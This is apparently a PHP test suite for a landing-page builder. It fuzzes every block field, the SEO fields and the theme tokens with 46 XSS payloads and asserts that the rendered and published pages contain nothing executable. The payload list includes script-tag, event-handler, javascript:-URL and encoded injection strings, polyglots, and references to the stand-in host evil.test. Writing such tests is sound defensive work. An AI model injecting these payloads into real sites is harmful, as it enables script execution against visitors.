<?php

declare(strict_types=1);

use App\Domain\Landing\BlockSchema;
use App\Domain\Landing\BlockType;
use App\Domain\Landing\FieldKind;
use App\Domain\Landing\LandingDocument;
use App\Domain\Landing\LandingDocumentInvalid;
use App\Features\Landing\LandingPages;
use App\Features\Landing\LandingRenderer;
use App\Features\Landing\MediaLibrary;
use App\Features\Landing\PublishedSite;
use Tests\Support\ImageFixtures;
use Tests\Support\LandingFixtures;
use Tests\Support\StubMediaReferences;

/*
 * ================================================================================
 * §3 row 7, clause 3: "a tenant cannot inject script through any block"
 * ================================================================================
 *
 * EVERY BLOCK, EVERY FIELD, 40+ PAYLOADS -- which is the ticket's own wording, and the
 * word that does the work is EVERY. A fuzz suite over a list somebody typed is only as
 * complete as that list, so the first case here does not fuzz anything: it asserts the
 * fuzz paths against BlockSchema itself, so a field added to the schema and not to the
 * sweep fails the suite rather than being quietly unfuzzed.
 *
 * THE ASSERTION IS STRUCTURAL, NOT TEXTUAL. "The payload does not appear in the output"
 * is the wrong test: the payload SHOULD appear, as text, escaped -- a validator that
 * silently dropped it would pass that assertion and lose the restaurant's content. So the
 * rendered page is PARSED, and what is asserted is that the resulting document has no
 * script element, no event-handler attribute and no javascript:/data: URL anywhere in it,
 * while the payload is still present as text.
 */

beforeEach(fn () => LandingFixtures::bucket());

/**
 * 46 payloads. Classic reflections, attribute breakouts, the encodings that defeat a
 * naive blocklist, and the two polyglots that defeat most of them.
 *
 * @return list<string>
 */
function xssPayloads(): array
{
    return [
        '<script>alert(1)</script>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script src=https://evil.test/x.js></script>',
        '<scr<script>ipt>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<form action="javascript:alert(1)"><button>x</button></form>',
        '<input autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<a href="javascript:alert(1)">click</a>',
        '<a href="JaVaScRiPt:alert(1)">click</a>',
        '<a href="&#106;avascript:alert(1)">click</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
        '<base href="https://evil.test/">',
        '<meta http-equiv="refresh" content="0;url=https://evil.test">',
        '<link rel="stylesheet" href="https://evil.test/x.css">',
        '<style>body{background:url(https://evil.test/x)}</style>',
        '<div style="background:url(javascript:alert(1))">x</div>',
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" autofocus onfocus="alert(1)',
        '`"><img src=x onerror=alert(1)>',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '<script>alert(1)</script>',
        '<![CDATA[<script>alert(1)</script>]]>',
        '<!--<script>alert(1)</script>-->',
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    ];
}

/**
 * Parse rendered HTML and report every dangerous construct in it.
 *
 * @return list<string>
 */
function dangerousConstructs(string $html): array
{
    $found = [];

    $previous = libxml_use_internal_errors(true);
    $document = new DOMDocument;
    $document->loadHTML('<?xml encoding="utf-8"?>'.$html, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);
    libxml_clear_errors();
    libxml_use_internal_errors($previous);

    foreach ((new DOMXPath($document))->query('//*') ?: [] as $element) {
        if (! $element instanceof DOMElement) {
            continue;
        }

        /*
         * ⚠ **THE TEMPLATE NOW HAS EXACTLY ONE SCRIPT ELEMENT OF ITS OWN, AND THIS CHECK IS
         * NARROWED RATHER THAN RELAXED.** It used to read *"the template has no script element
         * of its own -- the JSON-LD block is R-131 -- so ANY script element in the output came
         * from a tenant value"*, and that stopped being true when Task 11 closed `R-131`.
         *
         * The invariant that mattered was never "no `<script>`": it was **nothing
         * EXECUTABLE**. `application/ld+json` is a data block -- browsers do not execute it,
         * and its only danger is an unescaped `</script>` inside the JSON, which
         * `StructuredData` prevents with `JSON_HEX_TAG` and no `JSON_UNESCAPED_SLASHES` and
         * which `StructuredDataTest` drives with hostile input.
         *
         * So one type is admitted, by EXACT MATCH, and every other script element -- including
         * one with no `type`, which is executable JavaScript by default -- is still a finding.
         * A tenant value cannot reach the `type` attribute: it is a literal in the template.
         */
        $tag = strtolower($element->tagName);

        if ($tag === 'script') {
            if (strtolower($element->getAttribute('type')) !== 'application/ld+json') {
                $found[] = '<script>';
            }

            // And the one admitted type must still be parseable JSON. A block that does not
            // parse is a block whose encoding failed, which is the failure shape this
            // position has.
            if (json_decode($element->textContent, true) === null) {
                $found[] = '<script type=ld+json does not parse>';
            }
        }

        if (in_array($tag, ['iframe', 'object', 'embed', 'base', 'form'], true)) {
            $found[] = '<'.$element->tagName.'>';
        }

        foreach (iterator_to_array($element->attributes) as $attribute) {
            $name = strtolower($attribute->name);
            $value = (string) $attribute->value;

            if (str_starts_with($name, 'on')) {
                $found[] = $element->tagName.'['.$name.']';
            }

            if (in_array($name, ['href', 'src', 'action', 'formaction', 'data', 'srcdoc'], true)
                && preg_match('/^\s*(javascript|data|vbscript)\s*:/i', $value) === 1) {
                $found[] = $element->tagName.'['.$name.'=scheme]';
            }

            // The theme's own attribute is the one place tenant input becomes CSS. A
            // url() or a second declaration smuggled into it would be a fetch from a
            // published page.
            if ($name === 'style' && preg_match('/url\s*\(|expression\s*\(|@import/i', $value) === 1) {
                $found[] = $element->tagName.'[style=css]';
            }
        }
    }

    // A meta refresh is the one meta that matters, and the template emits several.
    foreach ((new DOMXPath($document))->query('//meta[@http-equiv]') ?: [] as $meta) {
        $found[] = 'meta[http-equiv]';
    }

    return array_values(array_unique($found));
}

it('has a detector that actually fires, which every assertion below depends on', function (): void {
    // ⚠ WITHOUT THIS CASE THE WHOLE FILE IS VACUOUS. Every injection assertion here is
    // `assertSame([], dangerousConstructs($html))`. If loadHTML ever failed, an XPath
    // changed, or a clause were edited wrong, all 46 payloads x 2 cases would pass in
    // silence. The neighbours each guard against exactly this -- StudioPanelInvariantTest
    // enumerates its routes first, ThemeTokenTest accepts all twelve tokens, MediaUploadTest
    // stores a clean SVG -- and this file had no such control until the §11 QA review
    // pointed out that it was the one asserting the task's named invariant.
    expect(dangerousConstructs('<p>hello &lt;script&gt;</p>'))->toBe([]);

    foreach ([
        '<script>alert(1)</script>' => '<script>',
        '<img src=x onerror=alert(1)>' => 'img[onerror]',
        '<a href="javascript:alert(1)">x</a>' => 'a[href=scheme]',
        '<meta http-equiv="refresh" content="0;url=https://evil.test">' => 'meta[http-equiv]',
        '<div style="background:url(https://evil.test/x)">x</div>' => 'div[style=css]',
        '<iframe src="https://evil.test"></iframe>' => '<iframe>',
        '<object data="x"></object>' => '<object>',
        '<form action="x"></form>' => '<form>',
        '<base href="https://evil.test/">' => '<base>',
    ] as $html => $expected) {
        // assertContains and not expect()->toContain($needle, $message): that matcher is
        // VARIADIC, so the message becomes a second needle. Guard rule 7 exists for the
        // negated form of this and this file has now paid for the positive form twice.
        $this->assertContains($expected, dangerousConstructs($html), "the detector missed {$html}");
    }
});

it('fuzzes every text field the schema has, so the sweep cannot go stale', function (): void {
    // THE COMPLETENESS CHECK, and it is first because every case below depends on it.
    // A field added to BlockSchema and not to LandingFixtures' path list would be a field
    // nothing fuzzes -- and nothing else in this suite would notice.
    $schemaPaths = [];

    foreach (BlockType::cases() as $index => $type) {
        foreach (BlockSchema::fields($type) as $name => $field) {
            if ($field->kind === FieldKind::ItemList) {
                foreach ($field->item ?? [] as $itemName => $itemField) {
                    $schemaPaths[] = "blocks.{$index}.fields.{$name}.0.{$itemName}";
                }

                continue;
            }

            $schemaPaths[] = "blocks.{$index}.fields.{$name}";
        }
    }

    $schemaPaths[] = 'seo.title';
    $schemaPaths[] = 'seo.description';
    $schemaPaths[] = 'seo.og_image';

    $covered = array_merge(LandingFixtures::authoredTextPaths(), LandingFixtures::authoredNonTextPaths());

    sort($schemaPaths);
    sort($covered);

    expect($covered)->toBe($schemaPaths);
});

it('renders 46 payloads into every text field of every block with no script reaching the page', function (): void {
    // All text fields carry the SAME payload at once, so one render covers every block
    // rather than 46 x 22 renders covering them one at a time. The structural assertion
    // below does not care which field a construct came from -- it asserts there is none.
    $references = new StubMediaReferences;
    $renderer = new LandingRenderer;
    $payloads = xssPayloads();

    expect($payloads)->toHaveCount(46);

    foreach ($payloads as $payload) {
        $input = LandingFixtures::fullPage();

        foreach (LandingFixtures::authoredTextPaths() as $path) {
            LandingFixtures::set($input, $path, $payload);
        }

        // A payload with a control character in it is REFUSED rather than rendered, and
        // that is also a pass -- the clause is that it cannot reach the page.
        try {
            $document = LandingDocument::fromInput($input, $references);
        } catch (LandingDocumentInvalid) {
            continue;
        }

        $html = $renderer->render($document, 'fuzz.example.test', 'Fuzz', []);

        $this->assertSame([], dangerousConstructs($html), 'payload reached the page: '.$payload);

        // AND IT IS STILL THERE, as text. A validator that silently stripped the payload
        // would pass the assertion above and lose the restaurant's content -- which is
        // the behaviour decision D5 exists to refuse.
        $this->assertStringContainsString(
            htmlspecialchars($payload, ENT_QUOTES, 'UTF-8'),
            $html,
            'payload was dropped rather than escaped: '.$payload,
        );
    }
});

it('refuses every payload in every url, address and number field rather than rendering it', function (): void {
    // The non-text fields do not escape a payload, they REFUSE it: a url is parsed and
    // re-assembled, an address goes through filter_var, a telephone and the three map
    // numbers have patterns. So the assertion here is that the document never forms.
    $references = new StubMediaReferences;
    $refused = 0;

    foreach (xssPayloads() as $payload) {
        foreach (LandingFixtures::authoredNonTextPaths() as $path) {
            $input = LandingFixtures::fullPage();
            LandingFixtures::set($input, $path, $payload);

            try {
                LandingDocument::fromInput($input, $references);
                $this->fail("[{$path}] accepted the payload: {$payload}");
            } catch (LandingDocumentInvalid) {
                $refused++;
            }
        }
    }

    expect($refused)->toBe(46 * count(LandingFixtures::authoredNonTextPaths()));
});

it('refuses every payload as a theme token name and as a theme token value', function (): void {
    // The theme is the one place a tenant value becomes CSS. A token name the schema does
    // not have is refused, and a value outside the token's own pattern is refused -- so
    // "theme overrides tokens only, never components" holds against hostile input and not
    // only against careless input.
    $references = new StubMediaReferences;

    foreach (xssPayloads() as $payload) {
        $byName = LandingFixtures::fullPage();
        $byName['theme'] = [$payload => '#ffffff'];

        expect(fn () => LandingDocument::fromInput($byName, $references))
            ->toThrow(LandingDocumentInvalid::class);

        $byValue = LandingFixtures::fullPage();
        $byValue['theme'] = ['color.accent' => $payload];

        expect(fn () => LandingDocument::fromInput($byValue, $references))
            ->toThrow(LandingDocumentInvalid::class);
    }
});

it('carries no raw echo in the template, which is the second half of D5', function (): void {
    // THE SOURCE, not the output. Every tenant-authored value reaching the page goes
    // through {{ }}, and the independence argument -- a validator bug alone cannot
    // inject, an escaping bug alone cannot either -- only holds while that is true of
    // every line. A `{!! !!}` added later fails here.
    $template = (string) file_get_contents(resource_path('views/landing/page.blade.php'));

    // Blade COMMENTS are stripped first, because this file documents the rule it enforces
    // and four of its comment lines mention the construct. Flagging the documentation of
    // the thing you enforce is guard rule 1's own recorded lesson.
    $code = (string) preg_replace('/\{\{--.*?--\}\}/s', '', $template);

    // `@php(` is NOT checked, and the first version of this case checked it and failed:
    // the template uses `@php($f = $block['fields'])` to name one array once per block.
    // That is not a raw echo and escapes nothing -- what it assigns is read back through
    // `{{ }}` like everything else. A rule that forbade it would be forbidding a local
    // variable, which is not what D5 is about.
    expect($code)->not->toContain('{!!')
        ->and($code)->not->toContain('!!}');

    // And the stripper really strips: the comments DO contain the construct, so a
    // no-op strip would make the assertion above vacuous.
    expect($template)->toContain('{!!');
});

it('publishes a hostile document end to end with nothing executable in the served bytes', function (): void {
    // The renderer sweep above is the whole-matrix pass. This is the end-to-end one: the
    // bytes that actually land in the object store, read back out of it.
    $tenant = $this->makeTenant(slug: 'hostile');
    $asset = (new MediaLibrary)->store($tenant, 'room.png', ImageFixtures::png());

    $input = LandingFixtures::fullPage($asset);

    foreach (LandingFixtures::authoredTextPaths() as $path) {
        // 16 CHARACTERS, because every field's length bound applies to a payload too and
        // the tightest field on the page is `price` at 20. The first two attempts here
        // were refused at 69 and at 27 characters -- the validator working, and not what
        // this case is trying to prove. This one still carries all three shapes that
        // matter: an attribute breakout, an element, and an event handler.
        LandingFixtures::set($input, $path, '"><svg onload=x>');
    }

    (new LandingPages)->saveDraft($tenant, $input);
    $published = (new LandingPages)->publish($tenant);

    $html = (string) MediaLibrary::disk()->get(PublishedSite::pointer($published->hostname));

    expect(dangerousConstructs($html))->toBe([])
        // Escaped, not dropped.
        ->and($html)->toContain('&lt;svg onload=x&gt;');
});
